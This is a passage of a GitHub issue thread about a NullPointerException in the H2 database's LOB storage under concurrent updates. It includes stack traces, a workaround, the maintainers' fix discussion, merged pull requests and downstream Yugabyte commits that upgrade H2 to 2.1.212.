| [@abelom](https://github.com/abelom) what version are you using? 202+?  Can you provide the full exception?  I ended up refactoring the database myself.  I have blobs stored in a specially purposed table (`create table blob (ID, BLOB_CONTENT)`).  I then use `blobID` in the refering table, the one that does heaving concurrent updates.  Now when I need to fetch the blob I perform asubsequent query. There is a overhead in performing the extra query but we never had any more issues with NPE.  We have implemented a distributed job queue service and the same table gets hammered from 40+ nodes and we have been able to achieve significant level of concurrency. |
| --- |

All reactions

Sorry, something went wrong.

[![@abelom](https://avatars.githubusercontent.com/u/575495?s=80&v=4)](/abelom)

Copy link

### **[abelom](/abelom)** commented [Feb 22, 2022](#issuecomment-1048052882)

| 2.1.210  ``` Caused by: java.lang.NullPointerException          at org.h2.mvstore.db.LobStorageMap.copyLob(LobStorageMap.java:252)          at org.h2.value.ValueLob.copyToResult(ValueLob.java:291)          at org.h2.result.LocalResult.cloneLobs(LocalResult.java:357)          at org.h2.result.LocalResult.addRow(LocalResult.java:409)          at org.h2.command.query.Select.queryFlat(Select.java:730)          at org.h2.command.query.Select.queryWithoutCache(Select.java:833)          at org.h2.command.query.Query.queryWithoutCacheLazyCheck(Query.java:197)          at org.h2.command.query.Query.query(Query.java:494)          at org.h2.command.query.Query.query(Query.java:457)          at org.h2.command.CommandContainer.query(CommandContainer.java:256)          at org.h2.command.Command.executeQuery(Command.java:190)          ... 36 more  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Feb 24, 2022](#issuecomment-1049700324)

| OK, so as far as I can tell, the problem appears to be that LobStorageMap::copyLob should be operating on a snapshot of the lobMap, taken from when the query started. Otherwise, if a LOB is updated while we are querying a table, the lobId might no longer be in the current version of the map.  [@andreitokar](https://github.com/andreitokar) Does that sound like a legimate theory? And any ideas how best to implement a fix? |
| --- |

All reactions

Sorry, something went wrong.

[![@ade90036](https://avatars.githubusercontent.com/u/6196152?s=80&v=4)](/ade90036)

Copy link

### **[ade90036](/ade90036)** commented [Feb 24, 2022](#issuecomment-1050080290)

| Can we double check if the code sample which was provided before from [@bwaldvogel](https://github.com/bwaldvogel) is still able to reproduce the issue? |
| --- |

All reactions

Sorry, something went wrong.

[![@bwaldvogel](https://avatars.githubusercontent.com/u/29931?s=80&u=2a2b671be6ec28ca9be08149b36d30594e4f877b&v=4)](/bwaldvogel)

Copy link

Author

### **[bwaldvogel](/bwaldvogel)** commented [Feb 25, 2022](#issuecomment-1050639110)

| I ran my reproducer with Java 17.0.2 and H2 version `2.1.210`.  I immediately see the following exception:  ``` Exception in thread "main" org.h2.jdbc.JdbcSQLNonTransientException: General error: "java.lang.NullPointerException: Cannot read field ""streamStoreId"" because ""<local11>"" is null"; SQL statement: select * from t1 where id = 1 [50000-210] 	at org.h2.message.DbException.getJdbcSQLException(DbException.java:573) 	at org.h2.message.DbException.getJdbcSQLException(DbException.java:496) 	at org.h2.message.DbException.get(DbException.java:216) 	at org.h2.message.DbException.convert(DbException.java:414) 	at org.h2.command.Command.executeQuery(Command.java:211) 	at org.h2.jdbc.JdbcPreparedStatement.executeQuery(JdbcPreparedStatement.java:128) 	at de.bwaldvogel.H2Issue1808Reproducer.main(Reproducer.java:38) Caused by: java.lang.NullPointerException: Cannot read field "streamStoreId" because "<local11>" is null 	at org.h2.mvstore.db.LobStorageMap.copyLob(LobStorageMap.java:252) 	at org.h2.value.ValueLob.copyToResult(ValueLob.java:291) 	at org.h2.result.LocalResult.cloneLobs(LocalResult.java:357) 	at org.h2.result.LocalResult.addRow(LocalResult.java:409) 	at org.h2.command.query.Select.queryFlat(Select.java:730) 	at org.h2.command.query.Select.queryWithoutCache(Select.java:833) 	at org.h2.command.query.Query.queryWithoutCacheLazyCheck(Query.java:197) 	at org.h2.command.query.Query.query(Query.java:494) 	at org.h2.command.query.Query.query(Query.java:457) 	at org.h2.command.CommandContainer.query(CommandContainer.java:256) 	at org.h2.command.Command.executeQuery(Command.java:190) 	... 2 more  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Mar 1, 2022](#issuecomment-1055100692)

| Noting that I cannot come up with a scheme for LOBs that does not require updating a table even just for SELECT. i.e. even just reading a table with LOBs will trigger writes to the DB file.  I am afraid this got a lot harder when we switched to a fully MVCC backend, there is now a lot more concurrency to deal with. |
| --- |

All reactions

Sorry, something went wrong.

[grandinj](/grandinj)
added a commit
to grandinj/h2database
that referenced
this issue
[Mar 2, 2022](#ref-commit-cc11a95)
[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=40&v=4)](/grandinj)

`[h2database#1808](https://github.com/h2database/h2database/issues/1808) [fix concurrent update of LOB](/grandinj/h2database/commit/cc11a953b1f0a8beab823d19433054f250748aad "#1808 fix concurrent update of LOB")`

`[cc11a95](/grandinj/h2database/commit/cc11a953b1f0a8beab823d19433054f250748aad)`

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=40&v=4)](/grandinj)
[grandinj](/grandinj)
mentioned this issue
[Mar 2, 2022](#ref-pullrequest-1156923982)

[#1808 fix concurrent update of LOB
#3451](/h2database/h2database/pull/3451)
 Closed

[![@andreitokar](https://avatars.githubusercontent.com/u/8950218?s=40&u=88b07e2933228893ab0ffbc651738148e74ecf09&v=4)](/andreitokar)
[andreitokar](/andreitokar)
mentioned this issue
[Mar 15, 2022](#ref-pullrequest-1169123878)

[Alternative fix for #1808
#3455](/h2database/h2database/pull/3455)
 Merged

[andreitokar](/andreitokar)
added a commit
that referenced
this issue
[Mar 15, 2022](#ref-commit-1bed7e2)
[![@andreitokar](https://avatars.githubusercontent.com/u/8950218?s=40&u=88b07e2933228893ab0ffbc651738148e74ecf09&v=4)](/andreitokar)

`[Merge pull request](/h2database/h2database/commit/1bed7e27f87b3d2e7523ec1722e2ff3b14c9ab02 "Merge pull request #3455 from andreitokar/LOB-AT

Alternative fix for #1808") [#3455](https://github.com/h2database/h2database/pull/3455) [from andreitokar/LOB-AT](/h2database/h2database/commit/1bed7e27f87b3d2e7523ec1722e2ff3b14c9ab02 "Merge pull request #3455 from andreitokar/LOB-AT

Alternative fix for #1808")`
…

`[1bed7e2](/h2database/h2database/commit/1bed7e27f87b3d2e7523ec1722e2ff3b14c9ab02)`

```
Alternative fix for [#1808](https://github.com/h2database/h2database/issues/1808)
```

[![@andreitokar](https://avatars.githubusercontent.com/u/8950218?s=80&u=88b07e2933228893ab0ffbc651738148e74ecf09&v=4)](/andreitokar)

Copy link

Contributor

### **[andreitokar](/andreitokar)** commented [Mar 15, 2022](#issuecomment-1068379022)

| Hopefully for good, this time around. |
| --- |

All reactions

Sorry, something went wrong.

[![@andreitokar](https://avatars.githubusercontent.com/u/8950218?s=40&u=88b07e2933228893ab0ffbc651738148e74ecf09&v=4)](/andreitokar)
[andreitokar](/andreitokar)
closed this as [completed](/h2database/h2database/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Mar 15, 2022](#event-6245843477)

[![@rusefillc](https://avatars.githubusercontent.com/u/48498823?s=80&u=5fc65a4810a17e6a87281b12d733e6a212011a94&v=4)](/rusefillc)

Copy link

### **[rusefillc](/rusefillc)** commented [Mar 15, 2022](#issuecomment-1068438498)

| Wow that's huge! What is the plan on next release? :) |
| --- |

All reactions

Sorry, something went wrong.

[![@ade90036](https://avatars.githubusercontent.com/u/6196152?s=80&v=4)](/ade90036)

Copy link

### **[ade90036](/ade90036)** commented [Mar 16, 2022](#issuecomment-1069208227)

| ill give it a test, with out workloads to see if it still throwing issues. |
| --- |

All reactions

Sorry, something went wrong.

[![@ade90036](https://avatars.githubusercontent.com/u/6196152?s=80&v=4)](/ade90036)

Copy link

### **[ade90036](/ade90036)** commented [Apr 1, 2022](#issuecomment-1086275518)

| I have given a fair bit of testing and it seems to have resolved the issue on my end.  Maybe can we get [@bwaldvogel](https://github.com/bwaldvogel) and [@abelom](https://github.com/abelom) to retest latest version (can be build from master) to see if they can still reproduce the issue?  I'm happy that in my particular workflow it is now behaving as expected.  [@andreitokar](https://github.com/andreitokar) so was the issue on the writing/flushing the transaction that subsequent read where loading an older blob, one that could have been going out of scope? |
| --- |

All reactions

Sorry, something went wrong.

[![@bwaldvogel](https://avatars.githubusercontent.com/u/29931?s=80&u=2a2b671be6ec28ca9be08149b36d30594e4f877b&v=4)](/bwaldvogel)

Copy link

Author

### **[bwaldvogel](/bwaldvogel)** commented [Apr 6, 2022](#issuecomment-1089875381)

| Thanks for your work, I can confirm that my reproducer works on current `master`! 👍 🚀  I even ran a quick bisect (for the fun of it 😅) and can confirm that [610bc5a](https://github.com/h2database/h2database/commit/610bc5a5b0acb23e09644b16206915ec6da5b220) fixes my reproducer. |
| --- |

 ❤️
1
 ade90036 reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[![@ade90036](https://avatars.githubusercontent.com/u/6196152?s=80&v=4)](/ade90036)

Copy link

### **[ade90036](/ade90036)** commented [Apr 6, 2022](#issuecomment-1090354721) via email

| When can we expect a release? … On Wed, 6 Apr 2022 at 07:34, Benedikt Waldvogel \*\*\*@\*\*\*.\*\*\*> wrote: Thanks for your work, I can confirm that my reproducer works on current master! 👍 🚀 I even ran a quick bisect (for the fun of it 😅) and can confirm that [610bc5a](https://github.com/h2database/h2database/commit/610bc5a5b0acb23e09644b16206915ec6da5b220) <[610bc5a](https://github.com/h2database/h2database/commit/610bc5a5b0acb23e09644b16206915ec6da5b220)> fixes my reproducer. — Reply to this email directly, view it on GitHub <[#1808 (comment)](https://github.com/h2database/h2database/issues/1808#issuecomment-1089875381)>, or unsubscribe <<https://github.com/notifications/unsubscribe-auth/ABPIXODD5LAAOXHBVCN7AHTVDUV7PANCNFSM4G5YAT6A>> . You are receiving this because you commented.Message ID: \*\*\*@\*\*\*.\*\*\*> |
| --- |

All reactions

Sorry, something went wrong.

[anmalysh-yb](/anmalysh-yb)
added a commit
to yugabyte/yugabyte-db
that referenced
this issue
[Apr 20, 2022](#ref-commit-8221b8c)
[![@anmalysh-yb](https://avatars.githubusercontent.com/u/80941592?s=40&v=4)](/anmalysh-yb)

`[[](/yugabyte/yugabyte-db/commit/8221b8c37500b2bea0da53d0bf2c8d3bc6dc8a42 "[PLAT-3752] Up-version H2 db to fix NPE

Summary: Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16618")[PLAT-3752](https://yugabyte.atlassian.net/browse/PLAT-3752)[] Up-version H2 db to fix NPE](/yugabyte/yugabyte-db/commit/8221b8c37500b2bea0da53d0bf2c8d3bc6dc8a42 "[PLAT-3752] Up-version H2 db to fix NPE

Summary: Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16618")`
…

`[8221b8c](/yugabyte/yugabyte-db/commit/8221b8c37500b2bea0da53d0bf2c8d3bc6dc8a42)`

```
Summary: Bug [h2database/h2database#1808](https://github.com/h2database/h2database/issues/1808) is finally fixed and available in H2 version 2.1.212

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: <https://phabricator.dev.yugabyte.com/D16618>
```

[anmalysh-yb](/anmalysh-yb)
added a commit
to yugabyte/yugabyte-db
that referenced
this issue
[Apr 20, 2022](#ref-commit-2d78ffe)
[![@anmalysh-yb](https://avatars.githubusercontent.com/u/80941592?s=40&v=4)](/anmalysh-yb)

`[[Backport 2.12][](/yugabyte/yugabyte-db/commit/2d78ffe1f6a6b4ebaf72fb34fa587260ff2eddd6 "[Backport 2.12][PLAT-3752] Up-version H2 db to fix NPE

Summary:
Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Original diff: https://phabricator.dev.yugabyte.com/D16618

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16619")[PLAT-3752](https://yugabyte.atlassian.net/browse/PLAT-3752)[] Up-version H2 db to fix NPE](/yugabyte/yugabyte-db/commit/2d78ffe1f6a6b4ebaf72fb34fa587260ff2eddd6 "[Backport 2.12][PLAT-3752] Up-version H2 db to fix NPE

Summary:
Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Original diff: https://phabricator.dev.yugabyte.com/D16618

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16619")`
…

`[2d78ffe](/yugabyte/yugabyte-db/commit/2d78ffe1f6a6b4ebaf72fb34fa587260ff2eddd6)`

```
Summary:
Bug [h2database/h2database#1808](https://github.com/h2database/h2database/issues/1808) is finally fixed and available in H2 version 2.1.212

Original diff: <https://phabricator.dev.yugabyte.com/D16618>

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: <https://phabricator.dev.yugabyte.com/D16619>
```

[anmalysh-yb](/anmalysh-yb)
added a commit
to yugabyte/yugabyte-db
that referenced
this issue
[Apr 20, 2022](#ref-commit-b080823)
[![@anmalysh-yb](https://avatars.githubusercontent.com/u/80941592?s=40&v=4)](/anmalysh-yb)

`[[Backport 2.8][](/yugabyte/yugabyte-db/commit/b0808239e7c80dfb388b7346fa2f8554f78f4d13 "[Backport 2.8][PLAT-3752] Up-version H2 db to fix NPE

Summary:
Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Original diff: https://phabricator.dev.yugabyte.com/D16618

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16620")[PLAT-3752](https://yugabyte.atlassian.net/browse/PLAT-3752)[] Up-version H2 db to fix NPE](/yugabyte/yugabyte-db/commit/b0808239e7c80dfb388b7346fa2f8554f78f4d13 "[Backport 2.8][PLAT-3752] Up-version H2 db to fix NPE

Summary:
Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Original diff: https://phabricator.dev.yugabyte.com/D16618

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16620")`
…

`[b080823](/yugabyte/yugabyte-db/commit/b0808239e7c80dfb388b7346fa2f8554f78f4d13)`

```
Summary:
Bug [h2database/h2database#1808](https://github.com/h2database/h2database/issues/1808) is finally fixed and available in H2 version 2.1.212

Original diff: <https://phabricator.dev.yugabyte.com/D16618>

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: <https://phabricator.dev.yugabyte.com/D16620>
```

[anmalysh-yb](/anmalysh-yb)
added a commit
to yugabyte/yugabyte-db
that referenced
this issue
[Apr 20, 2022](#ref-commit-61c077e)
[![@anmalysh-yb](https://avatars.githubusercontent.com/u/80941592?s=40&v=4)](/anmalysh-yb)

`[[Backport 2.6][](/yugabyte/yugabyte-db/commit/61c077ec705546f2eeee2ddb4916538977c791fb "[Backport 2.6][PLAT-3752] Up-version H2 db to fix NPE

Summary:
Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Original diff: https://phabricator.dev.yugabyte.com/D16618

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16621")[PLAT-3752](https://yugabyte.atlassian.net/browse/PLAT-3752)[] Up-version H2 db to fix NPE](/yugabyte/yugabyte-db/commit/61c077ec705546f2eeee2ddb4916538977c791fb "[Backport 2.6][PLAT-3752] Up-version H2 db to fix NPE

Summary:
Bug https://github.com/h2database/h2database/issues/1808 is finally fixed and available in H2 version 2.1.212

Original diff: https://phabricator.dev.yugabyte.com/D16618

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: https://phabricator.dev.yugabyte.com/D16621")`
…

`[61c077e](/yugabyte/yugabyte-db/commit/61c077ec705546f2eeee2ddb4916538977c791fb)`

```
Summary:
Bug [h2database/h2database#1808](https://github.com/h2database/h2database/issues/1808) is finally fixed and available in H2 version 2.1.212

Original diff: <https://phabricator.dev.yugabyte.com/D16618>

Test Plan: sbt test

Reviewers: sb-yb, nsingh

Reviewed By: nsingh

Subscribers: jenkins-bot, yugaware

Differential Revision: <https://phabricator.dev.yugabyte.com/D16621>
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F1808)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [#1808 fix concurrent update of LOB](/h2database/h2database/pull/3451)
 [grandinj/h2database](/grandinj/h2database)

11 participants

[![@bwaldvogel](https://avatars.githubusercontent.com/u/29931?s=52&v=4)](/bwaldvogel) [![@abelom](https://avatars.githubusercontent.com/u/575495?s=52&v=4)](/abelom) [![@grandinj](https://avatars.githubusercontent.com/u/796121?s=52&v=4)](/grandinj) [![@tsegall](https://avatars.githubusercontent.com/u/2955355?s=52&v=4)](/tsegall) [![@ade90036](https://avatars.githubusercontent.com/u/6196152?s=52&v=4)](/ade90036) [![@rgoede](https://avatars.githubusercontent.com/u/6567529?s=52&v=4)](/rgoede) [![@andreitokar](https://avatars.githubusercontent.com/u/8950218?s=52&v=4)](/andreitokar) [![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=52&v=4)](/katzyn) [![@vineetvdubey](https://avatars.githubusercontent.com/u/35378726?s=52&v=4)](/vineetvdubey) [![@rusefillc](https://avatars.githubusercontent.com/u/48498823?s=52&v=4)](/rusefillc) [![@NicoleG25](https://avatars.githubusercontent.com/u/50918335?s=52&v=4)](/NicoleG25)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


